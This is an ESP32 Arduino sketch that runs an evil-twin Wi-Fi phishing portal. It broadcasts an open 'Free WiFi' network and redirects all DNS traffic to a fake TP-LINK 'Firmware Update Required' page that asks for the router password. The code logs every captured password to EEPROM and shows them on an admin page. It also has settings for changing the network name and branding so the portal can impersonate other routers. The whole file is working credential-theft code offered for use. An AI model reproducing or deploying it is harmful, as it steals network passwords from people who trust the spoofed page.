// Developer: Sreeraj
// GitHub: https://github.com/s-r-e-e-r-a-j

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <EEPROM.h>
#include <map>

const char* SSID_NAME = "Free WiFi";
#define LED_BUILTIN 2
#define SUBTITLE "Router Administration"
#define TITLE "Firmware Update Required"
#define BODY "Critical security update available for your router. Update now to protect your network from vulnerabilities."
#define POST_TITLE "Installing Update..."
#define POST_BODY "Downloading and installing firmware update v2.1.4. Please do not disconnect or power off your router."
#define PASS_TITLE "Saved Credentials"
#define CLEAR_TITLE "Storage Cleared"

const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(192, 168, 1, 1);

String allPass = "";
String newSSID = "";
String currentSSID = "";
String footerText = "&copy; 2024 TP-LINK Technologies Co., Ltd. All rights reserved.";
String routerModel = "Archer C7";
String routerVersion = "2.1.4";
String deviceModel = "Archer C7 v5.0";
String firmwareVersion = "1.0.3 Build 20200101";
String macAddress = "74:DA:38:4E:23:AC";
String adminPassword = "admin123";

int initialCheckLocation = 20;
int passStart = 30;
int passEnd = passStart;
int footerStart = 100;
int modelStart = 150;
int versionStart = 180;
int deviceModelStart = 210;
int firmwareStart = 240;
int macStart = 270;

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

std::map<String, bool> authenticatedClients;
std::map<String, unsigned long> clientLoginTime;
const unsigned long SESSION_TIMEOUT = 3600000;

String getClientID() {
  return webServer.client().remoteIP().toString();
}

bool isClientAuthenticated() {
  String clientID = getClientID();
  if (!authenticatedClients[clientID]) return false;
  if (millis() - clientLoginTime[clientID] > SESSION_TIMEOUT) {
    authenticatedClients[clientID] = false;
    return false;
  }
  return true;
}

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "<div style='text-align:center; margin-top:30px; padding:15px; background:#f5f5f5; border-top:1px solid #ddd; font-size:14px; color:#666;'>" + footerText + "</div></body></html>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "* { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }"
    "body { background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }"
    ".router-container { max-width:500px; width:100%; background:white; border-radius:20px; box-shadow:0 20px 60px rgba(0,0,0,0.3); overflow:hidden; animation:slideIn 0.5s ease; }"
    "@keyframes slideIn { from { transform:translateY(-20px); opacity:0; } to { transform:translateY(0); opacity:1; } }"
    ".router-header { background:linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); color:white; padding:30px; text-align:center; }"
    ".router-header h1 { font-size:24px; margin-bottom:5px; font-weight:500; }"
    ".router-header p { font-size:14px; opacity:0.9; }"
    ".router-content { padding:30px; }"
    ".warning-badge { background:#fff3cd; color:#856404; padding:12px 20px; border-radius:12px; margin-bottom:25px; display:flex; align-items:center; gap:10px; font-size:14px; border-left:4px solid #ffc107; }"
    ".input-group { margin-bottom:20px; }"
    ".input-group label { display:block; margin-bottom:8px; color:#333; font-weight:500; font-size:14px; }"
    ".input-group input { width:100%; padding:15px 20px; border:2px solid #e0e0e0; border-radius:12px; font-size:16px; transition:all 0.3s; background:#f8f9fa; margin-bottom:15px; }"
    ".input-group input:focus { outline:none; border-color:#2a5298; background:white; box-shadow:0 0 0 4px rgba(42,82,152,0.1); }"
    ".btn { background:linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); color:white; border:none; padding:15px 30px; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:all 0.3s; text-transform:uppercase; letter-spacing:1px; margin-top:10px; }"
    ".btn-admin { display: inline-block; padding: 12px 30px; background-color: #28a745; color: #fff; border-radius: 4px; text-decoration: none; }"
    ".btn:hover { transform:translateY(-2px); box-shadow:0 10px 30px rgba(30,60,114,0.3); }"
    ".status-bar { background:#e8f4fd; padding:15px; border-radius:12px; margin-bottom:25px; display:flex; align-items:center; gap:15px; }"
    ".status-bar .led { width:12px; height:12px; background:#4caf50; border-radius:50%; animation:pulse 2s infinite; }"
    "@keyframes pulse { 0% { box-shadow:0 0 0 0 rgba(76,175,80,0.7); } 70% { box-shadow:0 0 0 10px rgba(76,175,80,0); } 100% { box-shadow:0 0 0 0 rgba(76,175,80,0); } }"
    ".device-info { background:#f8f9fa; border-radius:12px; padding:15px; margin-bottom:25px; font-size:14px; color:#666; border:1px solid #e0e0e0; }"
    ".device-info div { display:flex; justify-content:space-between; margin-bottom:8px; }"
    ".device-info div:last-child { margin-bottom:0; }"
    ".device-info span { color:#333; font-weight:500; }"
    ".progress-bar { width:100%; height:8px; background:#e0e0e0; border-radius:4px; margin:20px 0; overflow:hidden; }"
    ".progress-bar-fill { width:70%; height:100%; background:linear-gradient(90deg, #1e3c72 0%, #2a5298 100%); animation:loading 2s infinite; }"
    "@keyframes loading { 0% { transform:translateX(-100%); } 100% { transform:translateX(100%); } }"
    ".password-list { background:#f8f9fa; border-radius:12px; padding:20px; margin:20px 0; border:1px solid #e0e0e0; }"
    ".password-list ol { margin-left:20px; color:#333; }"
    ".password-list li { margin-bottom:10px; padding:8px; background:white; border-radius:8px; border:1px solid #e0e0e0; font-family:monospace; }"
    ".button-group { display:flex; gap:10px; justify-content:center; margin-top:20px; margin-bottom:20px; flex-wrap:wrap; }"
    ".button-group .btn { width:auto; padding:12px 25px; }"
    ".btn-sm { padding:12px 25px; width:auto; display:inline-block; text-decoration:none; }"
    ".text-center { text-align:center; }"
    ".footer-input { width:100%; padding:10px; margin:10px 0; border:2px solid #e0e0e0; border-radius:8px; }"
    ".settings-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:20px; }"
    ".settings-item { background:#f8f9fa; padding:10px; border-radius:8px; border:1px solid #e0e0e0; }"
    ".settings-item label { font-size:12px; color:#666; display:block; margin-bottom:5px; }"
    ".settings-item input { width:100%; padding:8px; border:1px solid #ddd; border-radius:4px; }"
    ".action-bar { display:flex; gap:10px; justify-content:center; margin:20px 0; flex-wrap:wrap; }"
    ".btn-home { background:#6c757d; }"
    ".btn-clear { background:#dc3545; }"
    ".btn-settings { background:#28a745; }"
    ".btn-footer { background:#ffc107; color:#333; }"
    ".btn-brand { background:#17a2b8; }"
    ".login-container { padding:20px; }"
    ".lock-icon { font-size:48px; color:#1e3c72; margin-bottom:20px; }";
  
  String h = "<!DOCTYPE html><html><head><title>" + a + " - Router Administration</title>"
    "<meta name=viewport content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
    "<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css'>"
    "<style>" + CSS + "</style>"
    "<meta charset='UTF-8'></head><body>"
    "<div class='router-container'>"
    "<div class='router-header'>"
    "<i class='fas fa-wifi' style='font-size:48px; margin-bottom:15px;'></i>"
    "<h1>" + a + "</h1>"
    "<p>Version: " + routerVersion + " | Model: " + routerModel + "</p>"
    "</div><div class='router-content'>";
  return h;
}

String loginPage() {
  return header("Admin Login") +
    "<div class='login-container'>"
    "<div class='text-center'><i class='fas fa-lock lock-icon'></i></div>"
    "<div class='warning-badge'><i class='fas fa-shield-alt'></i> Admin Access Required</div>"
    "<form action=/login method=post class='input-group'>"
    "<label><i class='fas fa-key' style='margin-right:8px;'></i>Enter Admin Password:</label>"
    "<input type=password name=p placeholder='Admin password' required>"
    "<button type=submit class='btn'><i class='fas fa-unlock' style='margin-right:8px;'></i>Login</button>"
    "</form>"
    "</div>" + footer();
}

String handleLogin() {
  String pass = input("p");
  if (pass == adminPassword) {
    String clientID = getClientID();
    authenticatedClients[clientID] = true;
    clientLoginTime[clientID] = millis();
    return header("Login Successful") +
      "<div class='text-center' style='padding:30px;'>"
      "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
      "<p style='font-size:18px; margin:20px;'>Access granted!</p>"
      "<a href='/pass' class='btn btn-admin'>Continue to Admin Panel</a>"
      "</div>" + footer();
  } else {
    return header("Login Failed") +
      "<div class='text-center' style='padding:30px;'>"
      "<i class='fas fa-times-circle' style='font-size:64px; color:#dc3545; margin-bottom:20px;'></i>"
      "<p style='font-size:18px; margin:20px;'>Wrong password!</p>"
      "<a href='/login' class='btn btn-admin'>Try Again</a>"
      "</div>" + footer();
  }
}

String index() {
  return header(TITLE) + 
    "<div class='warning-badge'><i class='fas fa-exclamation-triangle'></i> Security vulnerabilities detected in your current firmware version.</div>"
    "<div class='device-info'>"
    "<div><span>Device Model:</span> " + deviceModel + "</div>"
    "<div><span>Current Version:</span> " + firmwareVersion + "</div>"
    "<div><span>MAC Address:</span> " + macAddress + "</div>"
    "<div><span>Security Risk:</span> <span style='color:#dc3545;'>Critical</span></div>"
    "</div>"
    "<div class='status-bar'><div class='led'></div><div><strong>System Status:</strong> Update required immediately</div></div>"
    "<p style='color:#666; margin-bottom:20px; line-height:1.6;'>" BODY "</p>"
    "<form action=/post method=post class='input-group'>"
    "<label><i class='fas fa-lock' style='margin-right:8px;'></i>Enter Router Password:</label>"
    "<input type=password name=m placeholder='Enter your router password' required>"
    "<button type=submit class='btn'><i class='fas fa-download' style='margin-right:8px;'></i>Install Update</button>"
    "</form>" + footer();
}

String posted() {
  String pass = input("m");
  allPass += "<li><b>" + pass + "</b> <span style='color:#999; float:right;'>" + String(millis()) + "</span></li>";
  for (int i = 0; i <= pass.length(); ++i) {
    EEPROM.write(passEnd + i, pass[i]);
  }
  passEnd += pass.length();
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + 
    "<div class='text-center' style='padding:20px 0;'>"
    "<i class='fas fa-sync fa-spin' style='font-size:48px; color:#1e3c72; margin-bottom:20px;'></i>"
    "<p style='font-size:18px; margin-bottom:15px;'>" POST_BODY "</p>"
    "<div class='progress-bar'><div class='progress-bar-fill'></div></div>"
    "<p style='color:#666; margin-top:15px;'>Do not close this window.</p>"
    "</div>" + footer();
}

String pass() {
  if (!isClientAuthenticated()) {
    return loginPage();
  }
  return header(PASS_TITLE) + 
    "<div class='password-list'>"
    "<h3 style='margin-bottom:15px; color:#333;'><i class='fas fa-history' style='margin-right:8px;'></i>Recent Activity:</h3>"
    "<ol style='list-style-type:none; margin-left:0;'>" + allPass + "</ol>"
    "</div>"
    "<div class='action-bar'>"
    "<a href='/clear' class='btn btn-sm btn-clear'><i class='fas fa-trash'></i> Clear</a>"
    "<a href='/ssid' class='btn btn-sm btn-settings'><i class='fas fa-edit'></i> Settings</a>"
    "<a href='/footer' class='btn btn-sm btn-footer'><i class='fas fa-certificate'></i> Footer</a>"
    "<a href='/brand' class='btn btn-sm btn-brand'><i class='fas fa-tag'></i> Brand</a>"
    "<a href='/logout' class='btn btn-sm btn-home'><i class='fas fa-sign-out-alt'></i> Logout</a>"
    "</div>" + footer();
}

String ssid() {
  if (!isClientAuthenticated()) {
    return loginPage();
  }
  return header("Network Settings") + 
    "<div class='device-info'>"
    "<div><span>Current SSID:</span> " + currentSSID + "</div>"
    "<div><span>Channel:</span> 6</div>"
    "<div><span>Security:</span> WPA2-PSK</div>"
    "</div>"
    "<form action=/postSSID method=post class='input-group'>"
    "<label><i class='fas fa-wifi' style='margin-right:8px;'></i>New Network Name (SSID):</label>"
    "<input type=text name=s placeholder='Enter new SSID' required>"
    "<p style='color:#666; font-size:12px; margin:10px 0;'>Warning: Changing SSID will disconnect all devices.</p>"
    "<button type=submit class='btn'><i class='fas fa-save' style='margin-right:8px;'></i>Save Changes</button>"
    "</form>"
    "<div class='action-bar'>"
    "<a href='/pass' class='btn btn-sm btn-settings'><i class='fas fa-key'></i> View Passwords</a>"
    "<a href='/logout' class='btn btn-sm btn-home'><i class='fas fa-sign-out-alt'></i> Logout</a>"
    "</div>" + footer();
}

String footerPage() {
  if (!isClientAuthenticated()) {
    return loginPage();
  }
  return header("Footer Settings") + 
    "<div class='device-info'>"
    "<div><span>Current Footer:</span> " + footerText + "</div>"
    "</div>"
    "<form action=/postFooter method=post class='input-group'>"
    "<label><i class='fas fa-certificate' style='margin-right:8px;'></i>New Footer Text:</label>"
    "<input type=text name=f class='footer-input' placeholder='Enter new footer text' value='" + footerText + "' required>"
    "<p style='color:#666; font-size:12px; margin:10px 0;'>Change the copyright text at the bottom of pages.</p>"
    "<button type=submit class='btn'><i class='fas fa-save' style='margin-right:8px;'></i>Update Footer</button>"
    "</form>"
    "<div class='action-bar'>"
    "<a href='/pass' class='btn btn-sm btn-settings'><i class='fas fa-key'></i> View Passwords</a>"
    "<a href='/ssid' class='btn btn-sm btn-settings'><i class='fas fa-wifi'></i> SSID Settings</a>"
    "<a href='/brand' class='btn btn-sm btn-brand'><i class='fas fa-tag'></i> Brand</a>"
    "<a href='/logout' class='btn btn-sm btn-home'><i class='fas fa-sign-out-alt'></i> Logout</a>"
    "</div>" + footer();
}

String brandPage() {
  if (!isClientAuthenticated()) {
    return loginPage();
  }
  String cleanModel = routerModel;
  String cleanVersion = routerVersion;
  String cleanDevice = deviceModel;
  String cleanFirmware = firmwareVersion;
  String cleanMac = macAddress;
  
  cleanModel.replace("\0", "");
  cleanVersion.replace("\0", "");
  cleanDevice.replace("\0", "");
  cleanFirmware.replace("\0", "");
  cleanMac.replace("\0", "");
  
  return header("Brand Settings") + 
    "<div class='device-info'>"
    "<div><span>Header Model:</span> " + cleanModel + "</div>"
    "<div><span>Header Version:</span> " + cleanVersion + "</div>"
    "<div><span>Device Model:</span> " + cleanDevice + "</div>"
    "<div><span>Firmware Version:</span> " + cleanFirmware + "</div>"
    "<div><span>MAC Address:</span> " + cleanMac + "</div>"
    "</div>"
    "<form action=/postBrand method=post>"
    "<div class='settings-grid'>"
    "<div class='settings-item'><label>Header Model</label><input type=text name=rm value='" + cleanModel + "'></div>"
    "<div class='settings-item'><label>Header Version</label><input type=text name=rv value='" + cleanVersion + "'></div>"
    "<div class='settings-item'><label>Device Model</label><input type=text name=dm value='" + cleanDevice + "'></div>"
    "<div class='settings-item'><label>Firmware Version</label><input type=text name=fv value='" + cleanFirmware + "'></div>"
    "<div class='settings-item'><label>MAC Address</label><input type=text name=mac value='" + cleanMac + "'></div>"
    "</div>"
    "<button type=submit class='btn'><i class='fas fa-save' style='margin-right:8px;'></i>Save Brand Settings</button>"
    "</form>"
    "<div class='action-bar'>"
    "<a href='/pass' class='btn btn-sm btn-settings'><i class='fas fa-key'></i> View Passwords</a>"
    "<a href='/ssid' class='btn btn-sm btn-settings'><i class='fas fa-wifi'></i> SSID Settings</a>"
    "<a href='/footer' class='btn btn-sm btn-footer'><i class='fas fa-certificate'></i> Footer</a>"
    "<a href='/logout' class='btn btn-sm btn-home'><i class='fas fa-sign-out-alt'></i> Logout</a>"
    "</div>" + footer();
}

String postedBrand() {
  if (!isClientAuthenticated()) {
    return loginPage();
  }
  if (webServer.hasArg("rm")) {
    routerModel = webServer.arg("rm");
    routerModel.replace("\0", "");
  }
  if (webServer.hasArg("rv")) {
    routerVersion = webServer.arg("rv");
    routerVersion.replace("\0", "");
  }
  if (webServer.hasArg("dm")) {
    deviceModel = webServer.arg("dm");
    deviceModel.replace("\0", "");
  }
  if (webServer.hasArg("fv")) {
    firmwareVersion = webServer.arg("fv");
    firmwareVersion.replace("\0", "");
  }
  if (webServer.hasArg("mac")) {
    macAddress = webServer.arg("mac");
    macAddress.replace("\0", "");
  }
  
  for (int i = 0; i < modelStart; i++) EEPROM.write(i, 0);
  
  for (int i = 0; i < routerModel.length(); ++i) EEPROM.write(modelStart + i, routerModel[i]);
  EEPROM.write(modelStart + routerModel.length(), '\0');
  
  for (int i = 0; i < routerVersion.length(); ++i) EEPROM.write(versionStart + i, routerVersion[i]);
  EEPROM.write(versionStart + routerVersion.length(), '\0');
  
  for (int i = 0; i < deviceModel.length(); ++i) EEPROM.write(deviceModelStart + i, deviceModel[i]);
  EEPROM.write(deviceModelStart + deviceModel.length(), '\0');
  
  for (int i = 0; i < firmwareVersion.length(); ++i) EEPROM.write(firmwareStart + i, firmwareVersion[i]);
  EEPROM.write(firmwareStart + firmwareVersion.length(), '\0');
  
  for (int i = 0; i < macAddress.length(); ++i) EEPROM.write(macStart + i, macAddress[i]);
  EEPROM.write(macStart + macAddress.length(), '\0');
  
  EEPROM.commit();
  
  return header("Brand Updated") + 
    "<div class='text-center' style='padding:30px 0;'>"
    "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
    "<p style='font-size:18px; margin-bottom:15px;'>Brand settings updated successfully!</p>"
    "<a href='/brand' class='btn btn-admin'>Back to Brand Settings</a>"
    "</div>" + footer();
}

String postedFooter() {
  if (!isClientAuthenticated()) {
    return loginPage();
  }
  String newFooter = input("f");
  newFooter.replace("\0", "");
  footerText = newFooter;
  
  for (int i = footerStart; i < footerStart + 50; i++) EEPROM.write(i, 0);
  
  for (int i = 0; i < newFooter.length(); ++i) {
    EEPROM.write(footerStart + i, newFooter[i]);
  }
  EEPROM.write(footerStart + newFooter.length(), '\0');
  EEPROM.commit();
  
  return header("Footer Updated") + 
    "<div class='text-center' style='padding:30px 0;'>"
    "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
    "<p style='font-size:18px; margin-bottom:15px;'>Footer has been updated to:</p>"
    "<p style='color:#666; margin-bottom:25px; font-style:italic;'>" + newFooter + "</p>"
    "<a href='/footer' class='btn btn-admin'>Back to Footer Settings</a>"
    "</div>" + footer();
}

String postedSSID() {
  if (!isClientAuthenticated()) {
    return loginPage();
  }
  String postedSSID = input("s");
  postedSSID.replace("\0", "");
  currentSSID = postedSSID;
  
  for (int i = 0; i < 30; i++) EEPROM.write(i, 0);
  
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID.c_str());
  
  return header("Settings Saved") + 
    "<div class='text-center' style='padding:30px 0;'>"
    "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
    "<p style='font-size:18px; margin-bottom:15px;'>SSID has been changed to: <strong>" + postedSSID + "</strong></p>"
    "<p style='color:#666; margin-bottom:25px;'>Please reconnect to the new network.</p>"
    "<a href='/ssid' class='btn btn-admin'>Back to SSID Settings</a>"
    "</div>" + footer();
}

String handleSSIDChange() {
  if (!isClientAuthenticated()) {
    return loginPage();
  }
  if (webServer.hasArg("name")) {
    String newSSID = webServer.arg("name");
    newSSID.replace("\0", "");
    newSSID.substring(0, 32);
    currentSSID = newSSID;
    
    for (int i = 0; i < 30; i++) EEPROM.write(i, 0);
    
    for (int i = 0; i < newSSID.length(); ++i) {
      EEPROM.write(i, newSSID[i]);
    }
    EEPROM.write(newSSID.length(), '\0');
    EEPROM.commit();
    WiFi.softAP(newSSID.c_str());
    String msg = "SSID changed to: " + newSSID + "<br>Reconnect to new network.";
    return header("SSID Updated") + "<div class='text-center' style='padding:30px;'>" + msg + "<br><br><a href='/ssid' class='btn btn-admin'>Back to SSID Settings</a></div>" + footer();
  }
  return header("Error") + "<div class='text-center' style='padding:30px;'>Usage: /ssid?name=NewSSID</div>" + footer();
}

String clear() {
  if (!isClientAuthenticated()) {
    return loginPage();
  }
  allPass = "";
  passEnd = passStart;
  
  for (int i = passStart; i < passStart + 100; i++) EEPROM.write(i, 0);
  
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  
  return header(CLEAR_TITLE) + 
    "<div class='text-center' style='padding:30px 0;'>"
    "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
    "<p style='font-size:18px; margin-bottom:15px;'>Logs have been cleared successfully.</p>"
    "<p style='color:#666; margin-bottom:25px;'>No historical data found.</p>"
    "<a href='/pass' class='btn btn-admin'>Back to Passwords</a>"
    "</div>" + footer();
}

void BLINK() {
  for (int counter = 0; counter < 6; counter++) {
    digitalWrite(LED_BUILTIN, counter % 2);
    delay(300);
  }
}

void setup() {
  Serial.begin(115200);
  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  for (int i = 0; i < 512; i++) {
    if (EEPROM.read(i) > 127) EEPROM.write(i, 0);
  }
  EEPROM.commit();

  String checkValue = "first";
  bool firstRun = false;
  
  for (int i = 0; i < checkValue.length(); ++i) {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i]) {
      firstRun = true;
      break;
    }
  }
  
  if (firstRun) {
    for (int i = 0; i < 512; i++) EEPROM.write(i, 0);
    
    for (int i = 0; i < checkValue.length(); ++i) {
      EEPROM.write(i + initialCheckLocation, checkValue[i]);
    }
    EEPROM.commit();
  }
  
  String ESSID;
  int i = 0;
  while (i < 30 && EEPROM.read(i) != '\0' && EEPROM.read(i) > 31) {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  i = passStart;
  while (i < passStart + 100 && EEPROM.read(i) != '\0' && EEPROM.read(i) > 31) {
    allPass += char(EEPROM.read(i));
    i++;
    passEnd = i;
  }
  
  String footerEEPROM;
  int f = footerStart;
  while (f < footerStart + 50 && EEPROM.read(f) != '\0' && EEPROM.read(f) > 31) {
    footerEEPROM += char(EEPROM.read(f));
    f++;
  }
  if (footerEEPROM.length() > 0) footerText = footerEEPROM;
  
  String modelEEPROM;
  int m = modelStart;
  while (m < modelStart + 30 && EEPROM.read(m) != '\0' && EEPROM.read(m) > 31) {
    modelEEPROM += char(EEPROM.read(m));
    m++;
  }
  if (modelEEPROM.length() > 0) routerModel = modelEEPROM;
  
  String versionEEPROM;
  int v = versionStart;
  while (v < versionStart + 30 && EEPROM.read(v) != '\0' && EEPROM.read(v) > 31) {
    versionEEPROM += char(EEPROM.read(v));
    v++;
  }
  if (versionEEPROM.length() > 0) routerVersion = versionEEPROM;
  
  String deviceModelEEPROM;
  int dm = deviceModelStart;
  while (dm < deviceModelStart + 30 && EEPROM.read(dm) != '\0' && EEPROM.read(dm) > 31) {
    deviceModelEEPROM += char(EEPROM.read(dm));
    dm++;
  }
  if (deviceModelEEPROM.length() > 0) deviceModel = deviceModelEEPROM;
  
  String firmwareEEPROM;
  int fw = firmwareStart;
  while (fw < firmwareStart + 30 && EEPROM.read(fw) != '\0' && EEPROM.read(fw) > 31) {
    firmwareEEPROM += char(EEPROM.read(fw));
    fw++;
  }
  if (firmwareEEPROM.length() > 0) firmwareVersion = firmwareEEPROM;
  
  String macEEPROM;
  int mc = macStart;
  while (mc < macStart + 30 && EEPROM.read(mc) != '\0' && EEPROM.read(mc) > 31) {
    macEEPROM += char(EEPROM.read(mc));
    mc++;
  }
  if (macEEPROM.length() > 0) macAddress = macEEPROM;
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  currentSSID = ESSID.length() > 1 ? ESSID : SSID_NAME;
  WiFi.softAP(currentSSID.c_str());

  dnsServer.start(DNS_PORT, "*", APIP);
  
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  
  webServer.on("/ssid", HTTP_GET, []() {
    if (webServer.hasArg("name")) {
      webServer.send(HTTP_CODE, "text/html", handleSSIDChange());
    } else {
      webServer.send(HTTP_CODE, "text/html", ssid());
    }
  });
  
  webServer.on("/postSSID", HTTP_POST, []() {
    webServer.send(HTTP_CODE, "text/html", postedSSID());
  });
  
  webServer.on("/footer", []() {
    webServer.send(HTTP_CODE, "text/html", footerPage());
  });
  
  webServer.on("/postFooter", HTTP_POST, []() {
    webServer.send(HTTP_CODE, "text/html", postedFooter());
  });
  
  webServer.on("/brand", []() {
    webServer.send(HTTP_CODE, "text/html", brandPage());
  });
  
  webServer.on("/postBrand", HTTP_POST, []() {
    webServer.send(HTTP_CODE, "text/html", postedBrand());
  });
  
  webServer.on("/pass", []() {
    webServer.send(HTTP_CODE, "text/html", pass());
  });
  
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  
  webServer.on("/login", HTTP_GET, []() {
    webServer.send(HTTP_CODE, "text/html", loginPage());
  });
  
  webServer.on("/login", HTTP_POST, []() {
    webServer.send(HTTP_CODE, "text/html", handleLogin());
  });
  
  webServer.on("/logout", []() {
    String clientID = getClientID();
    authenticatedClients[clientID] = false;
    webServer.send(HTTP_CODE, "text/html", header("Logged Out") + 
      "<div class='text-center' style='padding:30px;'>"
      "<i class='fas fa-sign-out-alt' style='font-size:64px; color:#1e3c72; margin-bottom:20px;'></i>"
      "<p style='font-size:18px; margin:20px;'>You have been logged out.</p>"
      "<a href='/login' class='btn btn-admin'>Login Again</a>"
      "</div>" + footer());
  });
  
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  
  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  
  Serial.println("\n========== ACCESS INFO ==========");
  Serial.print("Connect to SSID: ");
  Serial.println(currentSSID);
  Serial.print("View passwords at: http://");
  Serial.print(WiFi.softAPIP());
  Serial.println("/pass");
  Serial.print("Change SSID via: http://");
  Serial.print(WiFi.softAPIP());
  Serial.println("/ssid?name=NewSSID");
  Serial.print("Change Footer via: http://");
  Serial.print(WiFi.softAPIP());
  Serial.println("/footer");
  Serial.print("Change Brand via: http://");
  Serial.print(WiFi.softAPIP());
  Serial.println("/brand");
  Serial.print("Admin Login: http://");
  Serial.print(WiFi.softAPIP());
  Serial.println("/login");
  Serial.println("================================\n");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
